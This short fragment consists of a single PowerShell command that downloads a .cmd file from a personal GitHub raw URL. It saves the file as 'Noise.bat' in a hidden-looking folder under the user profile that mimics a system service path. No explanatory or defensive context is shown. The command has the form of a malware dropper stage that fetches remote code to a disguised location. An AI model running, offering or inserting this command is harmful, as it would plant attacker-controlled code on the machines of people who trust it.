...
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.art.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"
